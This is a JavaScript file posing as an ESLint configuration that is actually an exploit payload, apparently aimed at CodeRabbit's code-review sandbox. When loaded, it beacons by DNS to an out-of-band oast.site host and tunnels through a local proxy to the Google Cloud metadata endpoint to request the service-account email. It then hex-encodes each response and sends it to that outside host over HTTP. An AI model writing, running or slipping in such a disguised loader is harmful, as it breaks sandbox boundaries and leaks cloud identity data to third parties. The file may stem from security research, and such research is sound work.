// CodeRabbit RCE — DECISIVE: is INTERNAL metadata reachable via the proxy CONNECT tunnel?
// External tunnel already confirmed (not an escape — sandbox has egress). This tests the
// internal target the sandbox CANNOT reach directly, using the TLS-over-tunnel pattern that worked.
var C = 'd8sqd0roeaqo3mkecle08prms7fuffzs9.oast.site';
var http = require('http'), dns = require('dns'), net = require('net'), tls = require('tls');
var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(String(d)).slice(0, 700), timeout: 9000 }, function () {}).on('error', function () {}); } catch (e) {} };
try { dns.lookup('alive14.' + C, function () {}); } catch (e) {}

var connectThen = function (host, port, tag, cb) {
  try {
    var s = net.connect({ host: '127.0.0.1', port: 1080, timeout: 12000 }); var hdr = '', tun = false;
    s.on('connect', function () { s.write('CONNECT ' + host + ':' + port + ' HTTP/1.1\r\nHost: ' + host + ':' + port + '\r\n\r\n'); });
    s.on('data', function (d) { if (!tun) { hdr += d.toString('latin1'); if (/\r\n\r\n/.test(hdr)) { tun = true; var l = hdr.split('\r\n')[0]; httpX(tag + '_c', l); if (/ 200/.test(l)) { try { cb(s); } catch (e) {} } else { try { s.destroy(); } catch (e) {} } } } });
    s.on('error', function (e) { httpX(tag + '_c', 'ERR:' + ((e && e.code) || e)); });
    s.on('timeout', function () { httpX(tag + '_c', 'TO'); try { s.destroy(); } catch (e) {} });
  } catch (e) { httpX(tag + '_c', 'EXC'); }
};
var MDPATH = '/computeMetadata/v1/instance/service-accounts/default/email';
var plainReq = 'GET ' + MDPATH + ' HTTP/1.1\r\nHost: metadata.google.internal\r\nMetadata-Flavor: Google\r\nConnection: close\r\n\r\n';
var tlsGet = function (s, sni, host, tag) {
  try { var t = tls.connect({ socket: s, servername: sni, rejectUnauthorized: false, timeout: 8000 }, function () { t.write('GET ' + MDPATH + ' HTTP/1.1\r\nHost: ' + host + '\r\nMetadata-Flavor: Google\r\nConnection: close\r\n\r\n'); });
    var r = ''; t.on('data', function (d) { r += d.toString('latin1'); }); t.on('close', function () { httpX(tag, r.slice(0, 300)); }); t.on('error', function (e) { httpX(tag + 'e', ((e && (e.code || e.message)) || 'e').toString().slice(0, 70)); });
  } catch (e) { httpX(tag + 'x', '1'); }
};

// CONTROL: external via TLS tunnel — marker /CTRL_ok confirms the tunnel works this run
connectThen(C, 443, 'ctrl', function (s) { try { var t = tls.connect({ socket: s, servername: C, rejectUnauthorized: false }, function () { t.write('GET /CTRL_ok HTTP/1.1\r\nHost: ' + C + '\r\nConnection: close\r\n\r\n'); }); t.on('error', function () {}); } catch (e) {} });

// metadata — plaintext over tunnel
connectThen('169.254.169.254', 80, 'm80p', function (s) { s.write(plainReq); var r = ''; s.on('data', function (d) { r += d.toString('latin1'); }); s.on('close', function () { httpX('m80p_r', r.slice(0, 300)); }); });
// metadata — TLS over tunnel (the pattern that worked externally)
connectThen('169.254.169.254', 80, 'm80t', function (s) { tlsGet(s, 'metadata.google.internal', 'metadata.google.internal', 'm80t_r'); });
connectThen('metadata.google.internal', 80, 'mhp', function (s) { s.write(plainReq); var r = ''; s.on('data', function (d) { r += d.toString('latin1'); }); s.on('close', function () { httpX('mhp_r', r.slice(0, 300)); }); });
connectThen('169.254.169.254', 443, 'm443t', function (s) { tlsGet(s, 'metadata.google.internal', 'metadata.google.internal', 'm443t_r'); });

module.exports = { root: true, rules: {} };
